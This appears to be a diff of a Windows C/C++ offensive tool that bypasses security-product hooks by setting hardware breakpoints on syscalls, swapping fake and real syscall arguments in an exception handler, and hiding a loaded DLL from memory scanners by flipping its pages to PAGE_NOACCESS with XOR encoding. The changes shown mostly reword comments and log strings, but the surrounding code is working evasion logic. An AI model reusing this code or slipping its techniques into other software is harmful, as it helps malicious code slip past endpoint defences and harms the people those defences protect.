@@ -226,7 +226,7 @@ BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
 
     dr7_t dr7 = { 0 };
 
-    /// we have dr0 - dr4 to set breakpoint. 
+    /// dr0 - dr3 to set breakpoint as debug address registers. 
     dr7.dr0_local = 1; // set DR0 as an execute breakpoint
     dr7.dr1_local = 1; // set DR1 as an execute breakpoint
 
@@ -248,20 +248,7 @@ BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
 
 // int g_bypass_method = 1; //
 HANDLE g_thread_handle = NULL;
-PCONTEXT g_thread_context = NULL;
-
-// typedef NTSTATUS (WINAPI* t_NtSetContextThread)(
-// 	HANDLE ThreadHandle, PCONTEXT Context
-// 	);
-
-// t_NtSetContextThread NtSetContextThread;
-
-// typedef NTSTATUS (WINAPI* t_NtResumeThread)(
-//     HANDLE ThreadHandle,
-//     PULONG SuspendCount
-// );
-
-// t_NtResumeThread NtResumeThread;
+// PCONTEXT g_thread_context = NULL;
 
 // Define NtResumeThread like : typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
 typedef ULONG (NTAPI *NtResumeThread_t)(HANDLE ThreadHandle, PULONG SuspendCount);
@@ -1693,15 +1680,13 @@ int main(int argc, char *argv[])
     printf("[!] Start No Access memory scan bypass\n");
 
     pNtResumeThread = (NtResumeThread_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtResumeThread");
-    // generate random encryption/decryption key
+    // generate random encoding/decoding key
     for (int i = 0; i < 16; i++) {
         r = rand();
         key[i] = (char) r;
     }
     BypassHookUsingBreakpoints();
     
-
-    // result = FlushInstructionCache(hProcess, NULL, 0);
 
     
     // CloseHandle(hThread);
@@ -1771,7 +1756,7 @@ BOOL PrintSectionDetails(const wchar_t* dllPath) {
 
 
 
-// Breakpoints: 
+// Syscall breakpoints handler with memory scan evasion: 
 
 // exception handler for hardware breakpoints
 LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
@@ -1783,7 +1768,7 @@ LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
         
 		// this exception was caused by DR0 (syscall breakpoint)
 		if (e->ContextRecord->Dr6 & 0x1) {
-			printf("syscall breakpoint triggered at address: 0x%llx\n",
+			printf("[^_^] syscall breakpoint triggered at address: 0x%llx\n",
 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
 
 			// replace the fake parameters with the real ones
@@ -1820,7 +1805,9 @@ LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
 
             VirtualProtect(dllEntryPoint1, dll_len, PAGE_NOACCESS, &oldPal);
             printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());
-            // //change the memory protection to PAGE_NOACCESS:
+            // //change the memory protection to PAGE_NOACCESS with NtProtectVirtualMemory:
+            // [!] NtProtectVirtualMemory is DIFFERENT from VirtualProtect, can not be mixed with VirtualProtect
+            // either use VirtualProtect or this function, not both.
             // NTSTATUS status = NtProtectVirtualMemory(
             // GetCurrentProcess(),
             // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
@@ -1847,7 +1834,7 @@ LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
 
 		// this exception was caused by DR1 (syscall ret breakpoint)
 		if (e->ContextRecord->Dr6 & 0x2) {
-			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
+			printf("[^_^] syscall ret breakpoint triggered at address: 0x%llx\n",
 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
             // use VirtualProcect to restore memory page to RX,
             // XOR magic code
@@ -1885,7 +1872,8 @@ LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
 		}
 	}
 
-	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution
-
+	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
+	//e->ContextRecord->Rip++;						//use instruction pointer to skip the loop
+    
 	return EXCEPTION_CONTINUE_EXECUTION;
 }
